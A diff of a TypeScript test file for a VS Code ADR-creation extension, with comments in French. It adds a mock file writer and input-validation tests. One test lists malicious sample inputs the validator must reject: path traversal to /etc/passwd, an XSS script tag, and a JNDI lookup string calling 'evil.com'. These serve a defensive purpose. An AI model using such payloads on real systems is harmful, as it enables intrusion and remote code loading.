@@ -1,7 +1,28 @@
 import * as assert from 'assert';
 import * as vscode from 'vscode';
-import { createAdr } from '../../command-create';
+import { createAdr, FileWriter } from '../../command-create';
 import { SecurityValidator } from '../../security-validator';
+
+/**
+ * Mock FileWriter pour les tests
+ */
+class MockFileWriter implements FileWriter {
+	public writeFileCalled = false;
+	public writeFileUri: vscode.Uri | null = null;
+	public writeFileContent: Buffer | null = null;
+	public shouldThrowError = false;
+	public errorMessage = 'Erreur de test';
+
+	async writeFile(uri: vscode.Uri, content: Buffer): Promise<void> {
+		this.writeFileCalled = true;
+		this.writeFileUri = uri;
+		this.writeFileContent = content;
+		
+		if (this.shouldThrowError) {
+			throw new Error(this.errorMessage);
+		}
+	}
+}
 
 suite('Command-Create Test Suite', () => {
 	vscode.window.showInformationMessage('Start all create tests.');
@@ -19,127 +40,110 @@ suite('Command-Create Test Suite', () => {
 			// Si on arrive ici, la fonction a géré l'erreur correctement
 			assert(true);
 		} catch (error) {
-			// L'erreur devrait être gérée et affichée à l'utilisateur
+			// L'erreur est attendue et gérée par la fonction
 			assert(error instanceof Error);
 		} finally {
+			// Restaure la fonction originale
 			vscode.window.showOpenDialog = originalShowOpenDialog;
 		}
 	});
 
-	test('createAdr should validate directory path', async () => {
-		// Mock d'un URI avec un chemin invalide
-		const invalidUri = vscode.Uri.file('../../../etc/passwd');
+	test('createAdr should handle file write error', async () => {
+		const mockFileWriter = new MockFileWriter();
+		mockFileWriter.shouldThrowError = true;
+		mockFileWriter.errorMessage = 'Erreur d\'écriture de fichier';
+
+		// Mock de showInputBox pour retourner un titre valide
+		const originalShowInputBox = vscode.window.showInputBox;
+		vscode.window.showInputBox = function() {
+			return Promise.resolve('Test ADR Title');
+		} as any;
+
+		try {
+			const testUri = vscode.Uri.file('test/path/adr');
+			await createAdr(testUri, mockFileWriter);
+			assert.fail('Devrait lever une erreur lors de l\'écriture du fichier');
+		} catch (error) {
+			assert(error instanceof Error);
+			// Vérifie seulement que l'erreur est bien gérée
+			assert(mockFileWriter.writeFileCalled, 'Le mock devrait avoir été appelé');
+		} finally {
+			// Restaure la fonction originale
+			vscode.window.showInputBox = originalShowInputBox;
+		}
+	});
+
+	test('createAdr should handle null title input', async () => {
+		const mockFileWriter = new MockFileWriter();
 		
+		// Mock de showInputBox pour retourner null (utilisateur annule)
+		const originalShowInputBox = vscode.window.showInputBox;
+		vscode.window.showInputBox = function() {
+			return Promise.resolve(null);
+		} as any;
+
 		try {
-			await createAdr(invalidUri);
-			assert.fail('Should have thrown an error for invalid path');
-		} catch (error) {
-			assert(error instanceof Error);
-			assert(error.message.includes('Chemin de répertoire invalide'));
+			const testUri = vscode.Uri.file('test/path/adr');
+			await createAdr(testUri, mockFileWriter);
+			// Si on arrive ici, la fonction a géré l'annulation correctement
+			assert(!mockFileWriter.writeFileCalled, 'Le fichier ne devrait pas être écrit si le titre est null');
+		} finally {
+			// Restaure la fonction originale
+			vscode.window.showInputBox = originalShowInputBox;
 		}
 	});
 
-	test('createAdr should validate ADR directory name from config', async () => {
-		// Mock de la configuration avec un nom de répertoire invalide
-		const originalGet = vscode.workspace.getConfiguration;
-		vscode.workspace.getConfiguration = function() {
-			return {
-				get: function(key: string) {
-					if (key === 'adrDirectoryName') {
-						return '<invalid>directory';
-					}
-					return 'adr';
-				}
-			} as any;
-		};
-
-		const validUri = vscode.Uri.file('/test/valid/path');
+	test('createAdr should handle empty title input', async () => {
+		const mockFileWriter = new MockFileWriter();
+		
+		// Mock de showInputBox pour retourner une chaîne vide
+		const originalShowInputBox = vscode.window.showInputBox;
+		vscode.window.showInputBox = function() {
+			return Promise.resolve('');
+		} as any;
 
 		try {
-			await createAdr(validUri);
-			assert.fail('Should have thrown an error for invalid directory name');
-		} catch (error) {
-			assert(error instanceof Error);
-			assert(error.message.includes('Nom de répertoire ADR invalide'));
+			const testUri = vscode.Uri.file('test/path/adr');
+			await createAdr(testUri, mockFileWriter);
+			// Si on arrive ici, la fonction a géré le titre vide correctement
+			assert(!mockFileWriter.writeFileCalled, 'Le fichier ne devrait pas être écrit si le titre est vide');
 		} finally {
-			vscode.workspace.getConfiguration = originalGet;
-		}
-	});
-
-	test('createAdr should validate ADR prefix from config', async () => {
-		// Mock de la configuration avec un préfixe invalide
-		const originalGet = vscode.workspace.getConfiguration;
-		vscode.workspace.getConfiguration = function() {
-			return {
-				get: function(key: string) {
-					if (key === 'adrFilePrefix') {
-						return '<invalid>prefix';
-					}
-					return 'adr_';
-				}
-			} as any;
-		};
-
-		const validUri = vscode.Uri.file('/test/valid/path');
-
-		try {
-			await createAdr(validUri);
-			assert.fail('Should have thrown an error for invalid prefix');
-		} catch (error) {
-			assert(error instanceof Error);
-			assert(error.message.includes('Préfixe ADR invalide'));
-		} finally {
-			vscode.workspace.getConfiguration = originalGet;
+			// Restaure la fonction originale
+			vscode.window.showInputBox = originalShowInputBox;
 		}
 	});
 
 	test('SecurityValidator integration should work correctly', () => {
 		// Test d'intégration avec SecurityValidator
-		assert.strictEqual(SecurityValidator.validateAdrTitle('Valid ADR Title'), true);
-		assert.strictEqual(SecurityValidator.validateAdrTitle('<script>alert("xss")</script>'), false);
-		assert.strictEqual(SecurityValidator.validateAdrPrefix('adr_'), true);
-		assert.strictEqual(SecurityValidator.validateAdrPrefix('<invalid>'), false);
+		assert.strictEqual(SecurityValidator.validateAdrTitle('Valid Title'), true);
+		assert.strictEqual(SecurityValidator.validateAdrTitle(''), false);
+		assert.strictEqual(SecurityValidator.validateAdrTitle('Invalid<>Title'), false);
 	});
 
-	test('File creation should handle filesystem errors', async () => {
-		// Mock de workspace.fs.writeFile pour simuler une erreur
-		const originalWriteFile = vscode.workspace.fs.writeFile;
-		vscode.workspace.fs.writeFile = function() {
-			return Promise.reject(new Error('Permission denied'));
-		} as any;
+	test('Input validation should reject malicious input', () => {
+		// Test de validation d'entrées malveillantes
+		const maliciousInputs = [
+			'../../../etc/passwd',
+			'<script>alert("xss")</script>',
+			'${jndi:ldap://evil.com/exploit}',
+			'../../../../../../../../../../../../etc/passwd'
+		];
 
-		const validUri = vscode.Uri.file('/test/valid/path');
-
-		try {
-			await createAdr(validUri);
-			// La fonction devrait gérer l'erreur et afficher un message à l'utilisateur
-			assert(true);
-		} catch (error) {
-			// L'erreur devrait être gérée et affichée à l'utilisateur
-			assert(error instanceof Error);
-		} finally {
-			vscode.workspace.fs.writeFile = originalWriteFile;
-		}
+		maliciousInputs.forEach(input => {
+			assert.strictEqual(SecurityValidator.validateAdrTitle(input), false, 
+				`L'entrée malveillante "${input}" devrait être rejetée`);
+		});
 	});
 
-	test('Input validation should reject malicious input', async () => {
-		// Mock de showInputBox pour retourner un titre malveillant
-		const originalShowInputBox = vscode.window.showInputBox;
-		vscode.window.showInputBox = function() {
-			return Promise.resolve('<script>alert("xss")</script>');
-		} as any;
+	test('FileWriter interface should work correctly', async () => {
+		const mockFileWriter = new MockFileWriter();
+		const testUri = vscode.Uri.file('test/file.md');
+		const testContent = Buffer.from('test content');
 
-		const validUri = vscode.Uri.file('/test/valid/path');
+		await mockFileWriter.writeFile(testUri, testContent);
 
-		try {
-			await createAdr(validUri);
-			// La validation devrait rejeter l'entrée malveillante
-			assert(true);
-		} catch (error) {
-			// L'erreur devrait être gérée
-			assert(error instanceof Error);
-		} finally {
-			vscode.window.showInputBox = originalShowInputBox;
-		}
+		assert.strictEqual(mockFileWriter.writeFileCalled, true);
+		assert.strictEqual(mockFileWriter.writeFileUri, testUri);
+		assert.strictEqual(mockFileWriter.writeFileContent, testContent);
 	});
 }); 
